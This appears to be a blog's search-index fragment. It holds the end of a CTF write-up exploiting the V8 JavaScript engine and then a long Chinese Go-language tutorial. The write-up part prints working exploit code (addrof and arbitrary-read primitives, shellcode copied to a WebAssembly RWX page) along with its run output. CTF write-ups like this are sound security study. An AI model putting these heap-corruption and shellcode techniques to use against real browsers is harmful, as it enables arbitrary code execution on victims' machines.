console.log(&quot;[!] Corruption failed. Try again.&quot;);  throw error;&#125;// Setup addrof primitive// Bottom 32 bits of float_arr[4] corresponds to addrof_arr[0]// We simply set addrof_arr[0] to the object whose address we want to leak// Then we read from float_arr[4]function addrof(obj) &#123;    addrof_arr[0] = obj;    return ftoi(float_arr[4]) &amp; 0xffffffffn;&#125;console.log(&quot;[+] Addrof primitive has been setup&quot;);// Setup an arbitrary read primitive for the V8 compressed heap// We do this by overwriting the elements pointer of our arb_read_arr to a// chosen address - 8 (making sure to keep the length set to 0x1000). We// subtract 8 because for any float array, arr[0] == (*elements_ptr + 8).// The elements pointer of arb_read_arr is at float_arr[17], offset found// through GDB.// addr must be a 32-bit value herefunction compressed_arb_read(addr) &#123;    float_arr[17] = itof((0x1000n &lt;&lt; 32n) + addr - 8n);    return ftoi(arb_read_arr[0]);&#125;console.log(&quot;[+] Arbitrary read primitive for the compressed heap has been setup&quot;);// Setup a function that writes our shellcode to a given address// We do this by overwriting the backing store address of the ArrayBuffer we// previously allocated to our chosen address. We then use the DataView that we// also allocated to write our shellcode to that address space.//// Using GDB, we find that the backing store address of our ArrayBuffer is// misaligned at float_arr[20] and float_arr[21]. The misalignment is as// follows://// * The upper 32-bits of float_arr[20] correspond to the lower 32 bits of//   the backing store address// * The lower 32-bits of float_arr[21] correspond to the upper 32 bits of//   the backing store address//// If this is confusing to you, that&#x27;s because it is very confusing :p I would// suggest looking at this in GDB and comparing whatever I mentioned above to// what you see in GDB until it makes sense//// addr must be a 64-bit value herefunction copy_shellcode(addr, shellcode) &#123;    // The backing store address of buf is not aligned to 64 bytes, so we have    // to write the upper 32-bits and the lower 32-bits of our address to two    // separate indices like this    float_arr[20] = itof((addr &amp; 0xffffffffn) &lt;&lt; 32n);    float_arr[21] = itof((addr &amp; 0xffffffff00000000n) &gt;&gt; 32n);    for (let i = 0; i &lt; shellcode.length; i++) &#123;        dataview.setUint32(4*i, shellcode[i], true);    &#125;&#125;// msfvenom -p linux/x64/exec CMD=&#x27;./flagprinter&#x27; --format dwordvar shellcode = [0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x0000000e, 0x6c662f2e, 0x72706761, 0x65746e69, 0x57560072, 0x0fe68948, 0x00000005];// Now, we leak the address of our RWX page// Using GDB, we know this address is at *(&amp;wasm_instance + 0x68)var rwx_page_addr = compressed_arb_read(addrof(wasm_instance) + 0x68n);console.log(&quot;[+] RWX page address found: &quot; + hex(rwx_page_addr));// Finally, we copy our shellcode to the RWX page and call the WASM function to// execute it.console.log(&quot;[+] Copying ./flagprinter shellcode to RWX page&quot;);copy_shellcode(rwx_page_addr, shellcode);console.log(&quot;[+] Printing flag!&quot;);f();\n\n\n\n\n\n./d8 --shell ./exploit.js                                                   ✔  00:49:32 [+] WebAssembly RWX page setup![+] Corrupting float_arr&#x27;s length to 2048[+] Corruption successful![+] Addrof primitive has been setup[+] Arbitrary read primitive for the compressed heap has been setup[+] RWX page address found: 0xaf5c5019000[+] Copying ./flagprinter shellcode to RWX page[+] Printing flag!DUCTF&#123;y0u_4r3_a_futUR3_br0ws3r_pwn_pr0d1gy!!&#125;\n\n\n\n","categories":["security"],"tags":["pwn"]},{"title":"Go语言基础","url":"/2021/03/30/dev/language/go/go/","content":"0x00 Golang安装 doc: https://golang.org/doc/\n ctrl c  &amp;&amp; ctrl v from https://www.runoob.com/go/go-tutorial.html\n0x01 Hello WorldGo 是一个开源的编程语言，它能让构造简单、可靠且高效的软件变得容易。\nGo是从2007年末由Robert Griesemer, Rob Pike, Ken Thompson主持开发，后来还加入了Ian Lance Taylor, Russ Cox等人，并最终于2009年11月开源，在2012年早些时候发布了Go 1稳定版本。现在Go的开发已经是完全开放的，并且拥有一个活跃的社区。\n\nGo 语言特色\n简洁、快速、安全\n并行、有趣、开源\n内存管理、数组安全、编译迅速\n\n\nGo 语言用途Go 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程语言。\n对于高性能分布式系统领域而言，Go 语言无疑比大多数其它语言有着更高的开发效率。它提供了海量并行的支持，这对于游戏服务端的开发而言是再好不过了。\n\ngolang编译器下载: https://golang.org/dl/\n第一个 Go 程序接下来我们来编写第一个 Go 程序 hello.go（Go 语言源文件的扩展是 .go），代码如下：\nhello.go 文件package mainimport &quot;fmt&quot;func main() &#123;  fmt.Println(&quot;Hello, World!&quot;)&#125;\n\nGo 语言的基础组成有以下几个部分：\n\n包声明\n引入包\n函数\n变量\n语句 &amp; 表达式\n注释\n\n接下来让我们来看下简单的代码，该代码输出了”Hello World!”:\npackage mainimport &quot;fmt&quot;func main() &#123;  // 这是我的第一个简单的程序  fmt.Println(&quot;Hello, World!&quot;)&#125;\n\n\n\n\n\n让我们来看下以上程序的各个部分：\n\n第一行代码 package main 定义了包名。你必须在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。\n下一行 import “fmt” 告诉 Go 编译器这个程序需要使用 fmt 包（的函数，或其他元素），fmt 包实现了格式化 IO（输入&#x2F;输出）的函数。\n下一行 func main() 是程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数）。\n下一行 &#x2F;…&#x2F; 是注释，在程序执行时将被忽略。单行注释是最常见的注释形式，你可以在任何地方使用以 &#x2F;&#x2F; 开头的单行注释。多行注释也叫块注释，均已以 &#x2F;* 开头，并以 *&#x2F; 结尾，且不可以嵌套使用，多行注释一般用于包的文档描述或注释成块的代码片段。\n下一行 fmt.Println(…) 可以将字符串输出到控制台，并在最后自动增加换行字符 \\n。使用 fmt.Print(“hello, world\\n”) 可以得到相同的结果。Print 和 Println 这两个函数也支持使用变量，如：fmt.Println(arr)。如果没有特别指定，它们会以默认的打印格式将变量 arr 输出到控制台。\n当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected ）。\n\n要执行 Go 语言代码可以使用 go run 命令。\n执行以上代码输出:\n$ go run hello.go Hello, World!\n\n此外我们还可以使用 go build 命令来生成二进制文件：\n$ go build hello.go $ lshello    hello.go$ ./hello Hello, World!\n\n注意需要注意的是 { 不能单独放在一行，所以以下代码在运行时会产生错误：\npackage mainimport &quot;fmt&quot;func main() &#123; *// 错误，&#123; 不能在单独的行上*  fmt.Println(&quot;Hello, World!&quot;)&#125;\n\n\n\n\n特性计算机软件经历了数十年的发展，形成了多种学术流派，有面向过程编程、面向对象编程、函数式编程、面向消息编程等，这些思想究竟孰优孰劣，众说纷纭。\n除了OOP外，近年出现了一些小众的编程哲学，Go语言对这些思想亦有所吸收。例如，Go语言接受了函数式编程的一些想法，支持匿名函数与闭包。再如，Go语言接受了以Erlang语言为代表的面向消息编程思想，支持goroutine和通道，并推荐使用消息而不是共享内存来进行并发编程。总体来说，Go语言是一个非常现代化的语言，精小但非常强大。\nGo 语言最主要的特性：\n\n自动垃圾回收\n更丰富的内置类型\n函数多返回值\n错误处理\n匿名函数和闭包\n类型和接口\n并发编程\n反射\n语言交互性\n\n0x02 语法基础Go 标记Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。如以下 GO 语句由 6 个标记组成：\nfmt.Println(&quot;Hello, World!&quot;)\n\n6 个标记是(每行一个)：\n1. fmt2. .3. Println4. (5. &quot;Hello, World!&quot;6. )\n\n\n行分隔符在 Go 程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号 ; 结尾，因为这些工作都将由 Go 编译器自动完成。\n如果你打算将多个语句写在同一行，它们则必须使用 ; 人为区分，但在实际开发中我们并不鼓励这种做法。\n以下为两个语句：\nfmt.Println(“Hello, World!”)fmt.Println(“菜鸟教程：runoob.com”)\n\n注释注释不会被编译，每一个包应该有相关注释。\n单行注释是最常见的注释形式，你可以在任何地方使用以 &#x2F;&#x2F; 开头的单行注释。多行注释也叫块注释，均已以 &#x2F;* 开头，并以 *&#x2F; 结尾。如：\n// 单行注释/* 我是多行注释 */\n\n\n标识符标识符用来命名变量、类型等程序实体。一个标识符实际上就是一个或是多个字母(AZ和az)数字(0~9)、下划线_组成的序列，但是第一个字符必须是字母或下划线而不能是数字。\n以下是有效的标识符：\nmahesh   kumar   abc   move_name   a_123myname50   _temp   j   a23b9   retVal\n\n以下是无效的标识符：\n\n1ab（以数字开头）\ncase（Go 语言的关键字）\na+b（运算符是不允许的）\n\n\n字符串连接Go 语言的字符串可以通过 + 实现：\npackage mainimport &quot;fmt&quot;func main() &#123;  fmt.Println(&quot;Google&quot; + &quot;Runoob&quot;)&#125;\n\n\n\n关键字下面列举了 Go 代码中会使用到的 25 个关键字或保留字：\n\n\n\nbreak\ndefault\nfunc\ninterface\nselect\n\n\n\ncase\ndefer\ngo\nmap\nstruct\n\n\nchan\nelse\ngoto\npackage\nswitch\n\n\nconst\nfallthrough\nif\nrange\ntype\n\n\ncontinue\nfor\nimport\nreturn\nvar\n\n\n除了以上介绍的这些关键字，Go 语言还有 36 个预定义标识符：\n\n\n\nappend\nbool\nbyte\ncap\nclose\ncomplex\ncomplex64\ncomplex128\nuint16\n\n\n\ncopy\nfalse\nfloat32\nfloat64\nimag\nint\nint8\nint16\nuint32\n\n\nint32\nint64\niota\nlen\nmake\nnew\nnil\npanic\nuint64\n\n\nprint\nprintln\nreal\nrecover\nstring\ntrue\nuint\nuint8\nuintptr\n\n\n程序一般由关键字、常量、变量、运算符、类型和函数组成。\n程序中可能会使用到这些分隔符：括号 ()，中括号 [] 和大括号 {}。\n程序中可能会使用到这些标点符号：.、,、;、: 和 …。\n\nGo 语言的空格Go 语言中变量的声明必须使用空格隔开，如：\nvar age int;\n\n语句中适当使用空格能让程序更易阅读。\n无空格：\nfruit=apples+oranges;\n\n在变量与运算符间加入空格，程序看起来更加美观，如：\nfruit = apples + oranges; \n\n\n格式化字符串Go 语言中使用 fmt.Sprintf 格式化字符串并赋值给新串：\npackage mainimport (  &quot;fmt&quot;)func main() &#123;  // %d 表示整型数字，%s 表示字符串*  var stockcode=123  var enddate=&quot;2020-12-31&quot;  var url=&quot;Code=%d&amp;endDate=%s&quot;  var target_url=fmt.Sprintf(url,stockcode,enddate)  fmt.Println(target_url)&#125;\n\n\n\n输出结果为：\nCode=123&amp;endDate=2020-12-31\n\n\n\n\n\n0x03 Go 语言数据类型在 Go 编程语言中，数据类型用于声明函数和变量。\n数据类型的出现是为了把数据分成所需内存大小不同的数据，编程的时候需要用大数据的时候才需要申请大内存，就可以充分利用内存。\nGo 语言按类别有以下几种数据类型：\n\n\n\n序号\n类型和描述\n\n\n\n1\n布尔型 布尔型的值只可以是常量 true 或者 false。一个简单的例子：var b bool &#x3D; true。\n\n\n2\n数字类型 整型 int 和浮点型 float32、float64，Go 语言支持整型和浮点型数字，并且支持复数，其中位的运算采用补码。\n\n\n3\n字符串类型: 字符串就是一串固定长度的字符连接起来的字符序列。Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。\n\n\n4\n派生类型: 包括：(a) 指针类型（Pointer）(b) 数组类型(c) 结构化类型(struct)(d) Channel 类型(e) 函数类型(f) 切片类型(g) 接口类型（interface）(h) Map 类型\n\n\n\n数字类型Go 也有基于架构的类型，例如：int、uint 和 uintptr。\n\n\n\n序号\n类型和描述\n\n\n\n1\nuint8 无符号 8 位整型 (0 到 255)\n\n\n2\nuint16 无符号 16 位整型 (0 到 65535)\n\n\n3\nuint32 无符号 32 位整型 (0 到 4294967295)\n\n\n4\nuint64 无符号 64 位整型 (0 到 18446744073709551615)\n\n\n5\nint8 有符号 8 位整型 (-128 到 127)\n\n\n6\nint16 有符号 16 位整型 (-32768 到 32767)\n\n\n7\nint32 有符号 32 位整型 (-2147483648 到 2147483647)\n\n\n8\nint64 有符号 64 位整型 (-9223372036854775808 到 9223372036854775807)\n\n\n浮点型\n\n\n序号\n类型和描述\n\n\n\n1\nfloat32 IEEE-754 32位浮点型数\n\n\n2\nfloat64 IEEE-754 64位浮点型数\n\n\n3\ncomplex64 32 位实数和虚数\n\n\n4\ncomplex128 64 位实数和虚数\n\n\n\n其他数字类型以下列出了其他更多的数字类型：\n\n\n\n序号\n类型和描述\n\n\n\n1\nbyte 类似 uint8\n\n\n2\nrune 类似 int32\n\n\n3\nuint 32 或 64 位\n\n\n4\nint 与 uint 一样大小\n\n\n5\nuintptr 无符号整型，用于存放一个指针\n\n\n0x04 Go 语言变量变量来源于数学，是计算机语言中能储存计算结果或能表示值抽象概念。\n变量可以通过变量名访问。\nGo 语言变量名由字母、数字、下划线组成，其中首个字符不能为数字。\n声明变量的一般形式是使用 var 关键字：\nvar identifier type\n\n可以一次声明多个变量：\nvar identifier1, identifier2 type\n\n实例\npackage mainimport &quot;fmt&quot;func main() &#123;  var a string = &quot;Runoob&quot;  fmt.Println(a)  var b, c int = 1, 2  fmt.Println(b, c)&#125;\n\n以上实例输出结果为：\nRunoob1 2\n\n变量声明第一种，指定变量类型，如果没有初始化，则变量默认为零值。\nvar v_name v_typev_name = value\n\n零值就是变量没有做初始化时系统默认设置的值。\npackage mainimport &quot;fmt&quot;func main() &#123;  // 声明一个变量并初始化*  var a = &quot;RUNOOB&quot;  fmt.Println(a)  // 没有初始化就为零值*  var b int  fmt.Println(b)  // bool 零值为 false*  var c bool  fmt.Println(c)&#125;\n\n以上实例执行结果为：\nRUNOOB0false\n\n\n数值类型（包括complex64&#x2F;128）为 0\n\n布尔类型为 false\n\n字符串为 **””**（空字符串）\n\n以下几种类型为 nil：\n\n\nvar a *intvar a []intvar a map[string] intvar a chan intvar a func(string) intvar a error // error 是接口\n\n\n\npackage mainimport &quot;fmt&quot;func main() &#123;  var i int  var f float64  var b bool  var s string  fmt.Printf(&quot;%v %v %v %q**\\n**&quot;, i, f, b, s)&#125;\n\n输出结果是：\n0 0 false &quot;&quot;\n\n第二种，根据值自行判定变量类型。\nvar v_name = value\n\n\n\npackage mainimport &quot;fmt&quot;func main() &#123;  var d = true  fmt.Println(d)&#125;\n\n输出结果是：\ntrue\n\n第三种，省略 var, 注意 *:&#x3D;* 左侧如果没有声明新的变量，就产生编译错误，格式：\nv_name := value\n\n例如：\nvar intVal int intVal :=1 // 这时候会产生编译错误intVal,intVal1 := 1,2 // 此时不会产生编译错误，因为有声明新的变量，因为 := 是一个声明语句\n\n可以将 var f string &#x3D; “Runoob” 简写为 f :&#x3D; “Runoob”：\npackage mainimport &quot;fmt&quot;func main() &#123;  f := &quot;Runoob&quot; *// var f string = &quot;Runoob&quot;*  fmt.Println(f)&#125;\n\n输出结果是：\nRunoob\n\n多变量声明//类型相同多个变量, 非全局变量var vname1, vname2, vname3 typevname1, vname2, vname3 = v1, v2, v3var vname1, vname2, vname3 = v1, v2, v3 // 和 python 很像,不需要显示声明类型，自动推断vname1, vname2, vname3 := v1, v2, v3 // 出现在 := 左侧的变量不应该是已经被声明过的，否则会导致编译错误// 这种因式分解关键字的写法一般用于声明全局变量var (    vname1 v_type1    vname2 v_type2)\n\n\n实例\npackage mainvar x, y intvar ( // 这种因式分解关键字的写法一般用于声明全局变量*  a int  b bool)var c, d int = 1, 2var e, f = 123, &quot;hello&quot;//这种不带声明格式的只能在函数体中出现*//g, h := 123, &quot;hello&quot;*func main()&#123;  g, h := 123, &quot;hello&quot;  println(x, y, a, b, c, d, e, f, g, h)&#125;\n\n以上实例执行结果为：\n0 0 0 false 1 2 123 hello 123 hello\n\n\n值类型和引用类型所有像 int、float、bool 和 string 这些基本类型都属于值类型，使用这些类型的变量直接指向存在内存中的值：\n\n当使用等号 = 将一个变量的值赋值给另一个变量时，如：j = i，实际上是在内存中将 i 的值进行了拷贝：\n\n你可以通过 &amp;i 来获取变量 i 的内存地址，例如：0xf840000040（每次的地址都可能不一样）。值类型的变量的值存储在栈中。\n内存地址会根据机器的不同而有所不同，甚至相同的程序在不同的机器上执行后也会有不同的内存地址。因为每台机器可能有不同的存储器布局，并且位置分配也可能不同。\n更复杂的数据通常会需要使用多个字，这些数据一般使用引用类型保存。\n一个引用类型的变量 r1 存储的是 r1 的值所在的内存地址（数字），或内存地址中第一个字所在的位置。\n\n这个内存地址称之为指针，这个指针实际上也被存在另外的某一个值中。\n同一个引用类型的指针指向的多个字可以是在连续的内存地址中（内存布局是连续的），这也是计算效率最高的一种存储形式；也可以将这些字分散存放在内存中，每个字都指示了下一个字所在的内存地址。\n当使用赋值语句 r2 &#x3D; r1 时，只有引用（地址）被复制。\n如果 r1 的值被改变了，那么这个值的所有引用都会指向被修改后的内容，在这个例子中，r2 也会受到影响。\n\n简短形式，使用 :&#x3D; 赋值操作符我们知道可以在变量的初始化时省略变量的类型而由系统自动推断，声明语句写上 var 关键字其实是显得有些多余了，因此我们可以将它们简写为 a :&#x3D; 50 或 b :&#x3D; false。\na 和 b 的类型（int 和 bool）将由编译器自动推断。\n这是使用变量的首选形式，但是它只能被用在函数体内，而不可以用于全局变量的声明与赋值。使用操作符 :&#x3D; 可以高效地创建一个新的变量，称之为初始化声明。\n注意事项如果在相同的代码块中，我们不可以再次对于相同名称的变量使用初始化声明，例如：a :&#x3D; 20 就是不被允许的，编译器会提示错误 no new variables on left side of :&#x3D;，但是 a &#x3D; 20 是可以的，因为这是给相同的变量赋予一个新的值。\n如果你在定义变量 a 之前使用它，则会得到编译错误 undefined: a。\n如果你声明了一个局部变量却没有在相同的代码块中使用它，同样会得到编译错误，例如下面这个例子当中的变量 a：\npackage mainimport &quot;fmt&quot;func main() &#123;  var a string = &quot;abc&quot;  fmt.Println(&quot;hello, world&quot;)&#125;\n\n尝试编译这段代码将得到错误 a declared and not used。\n此外，单纯地给 a 赋值也是不够的，这个值必须被使用，所以使用\nfmt.Println(&quot;hello, world&quot;, a)\n\n会移除错误。\n但是全局变量是允许声明但不使用的。 同一类型的多个变量可以声明在同一行，如：\nvar a, b, c int\n\n多变量可以在同一行进行赋值，如：\nvar a, b intvar c stringa, b, c = 5, 7, &quot;abc&quot;\n\n上面这行假设了变量 a，b 和 c 都已经被声明，否则的话应该这样使用：\na, b, c := 5, 7, &quot;abc&quot;\n\n右边的这些值以相同的顺序赋值给左边的变量，所以 a 的值是 5， b 的值是 7，c 的值是 “abc”。\n这被称为 并行 或 同时 赋值。\n如果你想要交换两个变量的值，则可以简单地使用 a, b &#x3D; b, a，两个变量的类型必须是相同。\n空白标识符 _ 也被用于抛弃值，如值 5 在：_, b &#x3D; 5, 7 中被抛弃。\n_ 实际上是一个只写变量，你不能得到它的值。这样做是因为 Go 语言中你必须使用所有被声明的变量，但有时你并不需要使用从一个函数得到的所有返回值。\n并行赋值也被用于当一个函数返回多个返回值时，比如这里的 val 和错误 err 是通过调用 Func1 函数同时得到：val, err &#x3D; Func1(var1)。\n0x05 Go 语言常量常量是一个简单值的标识符，在程序运行时，不会被修改的量。\n常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。\n常量的定义格式：\nconst identifier [type] = value\n\n你可以省略类型说明符 [type]，因为编译器可以根据变量的值来推断其类型。\n\n显式类型定义： const b string = &quot;abc&quot;\n隐式类型定义： const b = &quot;abc&quot;\n\n多个相同类型的声明可以简写为：\nconst c_name1, c_name2 = value1, value2\n\n以下实例演示了常量的应用：\npackage mainimport &quot;fmt&quot;func main() &#123;  const LENGTH int = 10  const WIDTH int = 5   var area int  const a, b, c = 1, false, &quot;str&quot; *//多重赋值*  area = LENGTH * WIDTH  fmt.Printf(&quot;面积为 : %d&quot;, area)  println()  println(a, b, c) &#125;\n\n\n\n\n以上实例运行结果为：\n面积为 : 501 false str\n\n常量还可以用作枚举：\nconst (    Unknown = 0    Female = 1    Male = 2)\n\n数字 0、1 和 2 分别代表未知性别、女性和男性。\n常量可以用len(), cap(), unsafe.Sizeof()函数计算表达式的值。常量表达式中，函数必须是内置函数，否则编译不过：\npackage mainimport &quot;unsafe&quot;const (  a = &quot;abc&quot;  b = len(a)  c = unsafe.Sizeof(a))func main()&#123;  println(a, b, c)&#125;\n\n\n\n以上实例运行结果为：\nabc 3 16\n\n\niotaiota，特殊常量，可以认为是一个可以被编译器修改的常量。\niota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。\niota 可以被用作枚举值：\nconst (    a = iota    b = iota    c = iota)\n\n第一个 iota 等于 0，每当 iota 在新的一行被使用时，它的值都会自动加 1；所以 a&#x3D;0, b&#x3D;1, c&#x3D;2 可以简写为如下形式：\nconst (    a = iota    b    c)\n\niota 用法package mainimport &quot;fmt&quot;func main() &#123;  const (      a = iota  //0      b      //1      c      //2      d = &quot;ha&quot;  //独立值，iota += 1      e      //&quot;ha&quot;  iota += 1      f = 100   //iota +=1      g      //100  iota +=1      h = iota  //7,恢复计数      i      //8  )  fmt.Println(a,b,c,d,e,f,g,h,i)&#125;\n\n以上实例运行结果为：\n0 1 2 ha ha 100 100 7 8\n\n再看个有趣的的 iota 实例：\npackage mainimport &quot;fmt&quot;const (  i=1&lt;&lt;iota  j=3&lt;&lt;iota  k  l)func main() &#123;  fmt.Println(&quot;i=&quot;,i)  fmt.Println(&quot;j=&quot;,j)  fmt.Println(&quot;k=&quot;,k)  fmt.Println(&quot;l=&quot;,l)&#125;\n\n\n\n以上实例运行结果为：\ni= 1j= 6k= 12l= 24\n\niota 表示从 0 开始自动加 1，所以 i&#x3D;1&lt;&lt;0, j&#x3D;3&lt;&lt;1（**&lt;&lt;** 表示左移的意思），即：i&#x3D;1, j&#x3D;6，这没问题，关键在 k 和 l，从输出结果看 k&#x3D;3&lt;&lt;2，l&#x3D;3&lt;&lt;3。\n简单表述:\n\ni&#x3D;1\n\n：左移 0 位,不变仍为 1;\n\nj&#x3D;3：左移 1 位,变为二进制 110, 即 6;\n\nk&#x3D;3：左移 2 位,变为二进制 1100, 即 12;\n\nl&#x3D;3：左移 3 位,变为二进制 11000,即 24。\n\n\n注：**&lt;&lt;n&#x3D;&#x3D;*(2^n)**。\n0x06 Go 语言运算符运算符用于在程序运行时执行数学或逻辑运算。\nGo 语言内置的运算符有：\n\n算术运算符\n关系运算符\n逻辑运算符\n位运算符\n赋值运算符\n其他运算符\n\n接下来让我们来详细看看各个运算符的介绍。\n\n算术运算符下表列出了所有Go语言的算术运算符。假定 A 值为 10，B 值为 20。\n\n\n\n运算符\n描述\n实例\n\n\n\n+\n相加\nA + B 输出结果 30\n\n\n-\n相减\nA - B 输出结果 -10\n\n\n*\n相乘\nA * B 输出结果 200\n\n\n&#x2F;\n相除\nB &#x2F; A 输出结果 2\n\n\n%\n求余\nB % A 输出结果 0\n\n\n++\n自增\nA++ 输出结果 11\n\n\n–\n自减\nA– 输出结果 9\n\n\n以下实例演示了各个算术运算符的用法：\npackage mainimport &quot;fmt&quot;func main() &#123;   var a int = 21   var b int = 10   var c int   c = a + b   fmt.Printf(&quot;第一行 - c 的值为 %d\\n&quot;, c )   c = a - b   fmt.Printf(&quot;第二行 - c 的值为 %d\\n&quot;, c )   c = a * b   fmt.Printf(&quot;第三行 - c 的值为 %d\\n&quot;, c )   c = a / b   fmt.Printf(&quot;第四行 - c 的值为 %d\\n&quot;, c )   c = a % b   fmt.Printf(&quot;第五行 - c 的值为 %d\\n&quot;, c )   a++   fmt.Printf(&quot;第六行 - a 的值为 %d\\n&quot;, a )   a=21   // 为了方便测试，a 这里重新赋值为 21   a--   fmt.Printf(&quot;第七行 - a 的值为 %d\\n&quot;, a )&#125;\n\n以上实例运行结果：\n第一行 - c 的值为 31第二行 - c 的值为 11第三行 - c 的值为 210第四行 - c 的值为 2第五行 - c 的值为 1第六行 - a 的值为 22第七行 - a 的值为 20\n\n\n\n关系运算符下表列出了所有Go语言的关系运算符。假定 A 值为 10，B 值为 20。\n\n\n\n运算符\n描述\n实例\n\n\n\n&#x3D;&#x3D;\n检查两个值是否相等，如果相等返回 True 否则返回 False。\n(A &#x3D;&#x3D; B) 为 False\n\n\n!&#x3D;\n检查两个值是否不相等，如果不相等返回 True 否则返回 False。\n(A !&#x3D; B) 为 True\n\n\n&gt;\n检查左边值是否大于右边值，如果是返回 True 否则返回 False。\n(A &gt; B) 为 False\n\n\n&lt;\n检查左边值是否小于右边值，如果是返回 True 否则返回 False。\n(A &lt; B) 为 True\n\n\n&gt;&#x3D;\n检查左边值是否大于等于右边值，如果是返回 True 否则返回 False。\n(A &gt;&#x3D; B) 为 False\n\n\n&lt;&#x3D;\n检查左边值是否小于等于右边值，如果是返回 True 否则返回 False。\n(A &lt;&#x3D; B) 为 True\n\n\n以下实例演示了关系运算符的用法：\npackage mainimport &quot;fmt&quot;func main() &#123;   var a int = 21   var b int = 10   if( a == b ) &#123;      fmt.Printf(&quot;第一行 - a 等于 b\\n&quot; )   &#125; else &#123;      fmt.Printf(&quot;第一行 - a 不等于 b\\n&quot; )   &#125;   if ( a &lt; b ) &#123;      fmt.Printf(&quot;第二行 - a 小于 b\\n&quot; )   &#125; else &#123;      fmt.Printf(&quot;第二行 - a 不小于 b\\n&quot; )   &#125;      if ( a &gt; b ) &#123;      fmt.Printf(&quot;第三行 - a 大于 b\\n&quot; )   &#125; else &#123;      fmt.Printf(&quot;第三行 - a 不大于 b\\n&quot; )   &#125;   /* Lets change value of a and b */   a = 5   b = 20   if ( a &lt;= b ) &#123;      fmt.Printf(&quot;第四行 - a 小于等于 b\\n&quot; )   &#125;   if ( b &gt;= a ) &#123;      fmt.Printf(&quot;第五行 - b 大于等于 a\\n&quot; )   &#125;&#125;\n\n以上实例运行结果：\n第一行 - a 不等于 b第二行 - a 不小于 b第三行 - a 大于 b第四行 - a 小于等于 b第五行 - b 大于等于 a\n\n逻辑运算符下表列出了所有Go语言的逻辑运算符。假定 A 值为 True，B 值为 False。\n\n\n\n运算符\n描述\n实例\n\n\n\n&amp;&amp;\n逻辑 AND 运算符。 如果两边的操作数都是 True，则条件 True，否则为 False。\n(A &amp;&amp; B) 为 False\n\n\n||\n逻辑 OR 运算符。 如果两边的操作数有一个 True，则条件 True，否则为 False。\n(A || B) 为 True\n\n\n!\n逻辑 NOT 运算符。 如果条件为 True，则逻辑 NOT 条件 False，否则为 True。\n!(A &amp;&amp; B) 为 True\n\n\n以下实例演示了逻辑运算符的用法：\npackage mainimport &quot;fmt&quot;func main() &#123;   var a bool = true   var b bool = false   if ( a &amp;&amp; b ) &#123;      fmt.Printf(&quot;第一行 - 条件为 true\\n&quot; )   &#125;   if ( a || b ) &#123;      fmt.Printf(&quot;第二行 - 条件为 true\\n&quot; )   &#125;   /* 修改 a 和 b 的值 */   a = false   b = true   if ( a &amp;&amp; b ) &#123;      fmt.Printf(&quot;第三行 - 条件为 true\\n&quot; )   &#125; else &#123;      fmt.Printf(&quot;第三行 - 条件为 false\\n&quot; )   &#125;   if ( !(a &amp;&amp; b) ) &#123;      fmt.Printf(&quot;第四行 - 条件为 true\\n&quot; )   &#125;&#125;\n\n以上实例运行结果：\n第二行 - 条件为 true第三行 - 条件为 false第四行 - 条件为 true\n\n位运算符位运算符对整数在内存中的二进制位进行操作。\n下表列出了位运算符 &amp;, |, 和 ^ 的计算：\n\n\n\np\nq\np &amp; q\np | q\np ^ q\n\n\n\n0\n0\n0\n0\n0\n\n\n0\n1\n0\n1\n1\n\n\n1\n1\n1\n1\n0\n\n\n1\n0\n0\n1\n1\n\n\n假定 A &#x3D; 60; B &#x3D; 13; 其二进制数转换为：\nA = 0011 1100B = 0000 1101-----------------A&amp;B = 0000 1100A|B = 0011 1101A^B = 0011 0001\n\nGo 语言支持的位运算符如下表所示。假定 A 为60，B 为13：\n\n\n\n运算符\n描述\n实例\n\n\n\n&amp;\n按位与运算符”&amp;”是双目运算符。 其功能是参与运算的两数各对应的二进位相与。\n(A &amp; B) 结果为 12, 二进制为 0000 1100\n\n\n|\n按位或运算符”|”是双目运算符。 其功能是参与运算的两数各对应的二进位相或\n(A | B) 结果为 61, 二进制为 0011 1101\n\n\n^\n按位异或运算符”^”是双目运算符。 其功能是参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。\n(A ^ B) 结果为 49, 二进制为 0011 0001\n\n\n&lt;&lt;\n左移运算符”&lt;&lt;”是双目运算符。左移n位就是乘以2的n次方。 其功能把”&lt;&lt;”左边的运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。\nA &lt;&lt; 2 结果为 240 ，二进制为 1111 0000\n\n\n&gt;&gt;\n右移运算符”&gt;&gt;”是双目运算符。右移n位就是除以2的n次方。 其功能是把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数。\nA &gt;&gt; 2 结果为 15 ，二进制为 0000 1111\n\n\n以下实例演示了位运算符的用法：\npackage mainimport &quot;fmt&quot;func main() &#123;   var a uint = 60      /* 60 = 0011 1100 */     var b uint = 13      /* 13 = 0000 1101 */   var c uint = 0             c = a &amp; b       /* 12 = 0000 1100 */   fmt.Printf(&quot;第一行 - c 的值为 %d\\n&quot;, c )   c = a | b       /* 61 = 0011 1101 */   fmt.Printf(&quot;第二行 - c 的值为 %d\\n&quot;, c )   c = a ^ b       /* 49 = 0011 0001 */   fmt.Printf(&quot;第三行 - c 的值为 %d\\n&quot;, c )   c = a &lt;&lt; 2     /* 240 = 1111 0000 */   fmt.Printf(&quot;第四行 - c 的值为 %d\\n&quot;, c )   c = a &gt;&gt; 2     /* 15 = 0000 1111 */   